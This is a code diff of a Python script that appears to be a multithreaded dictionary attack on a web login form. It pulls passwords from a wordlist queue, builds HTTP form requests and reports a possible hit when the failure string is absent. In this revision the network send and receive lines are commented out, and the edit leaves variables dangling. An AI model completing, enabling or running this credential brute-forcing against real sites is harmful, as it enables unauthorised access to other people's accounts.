@@ -184,29 +184,30 @@ def testrun(name,status):
 		except Queue.Empty:
 			pass
 
-def run(headers, formdata, get_pw):
+def run(name,status): #headers, formdata, get_pw):
 	"""get_pw should be a function that will return the next pw
 	"""
-	print "thread"
-	sys.stdout.write('[%s] Connecting....' % getName())
-	#soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#soc.connect((ip,port))
-	sys.stdout.write('done\n')
+	sys.stdout.write('[%s] Connecting....\n' % name)
+#	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#	soc.connect((ip,port))
 	
-	"""Get next word to attempt"""
-	pw = pwq.get()
-	formd = formdata % pw
-	head = headers % len(formd)
-	req = '%s\r\n\r\n%s' % (head,formd)
-	data = ''
-#	soc.send(req)
-#	while data.lower().find('</html') < 0:
-#		data += soc.recv(8096)
-	if data.lower().find(fail.lower()) < 0:
-		print "Tried password %s, fail string not found.  Possible password detected.  Response: %s" % (pw, data)
-	pwq.task_done()
-#		running = False
-#			break
+	while running is True:
+		try:
+			"""Get next word to attempt"""
+			pw = pwq.get(block=False)
+			formd = formdata % pw
+			head = headers % len(formd)
+			req = '%s\r\n\r\n%s' % (head,formd)
+			print req
+			data = ''
+		#	soc.send(req)
+		#	while data.lower().find('</html') < 0:
+		#		data += soc.recv(8096)
+			if data.lower().find(fail.lower()) < 0:
+				print "Tried password %s, fail string not found.  Possible password detected.  Response: %s" % (pw, data)
+			pwq.task_done()
+		except Queue.Empty:
+			pass
 
 # this is just a quick and dirty way to get the count of pws....
 pwcount = sum(1 for line in open(wordlist))
@@ -222,7 +223,7 @@ Spawn a bunch of threads... each will wait until data become available
 in the pwq before they try to send data
 """
 for x in range(threadcount):
-	t = threading.Thread(target=testrun, kwargs={'name':x, 'status':status})
+	t = threading.Thread(target=run, kwargs={'name':x, 'status':status})
 	t.start()
 
 """Loop over wordlist, put words into Queue as spaces are available"""
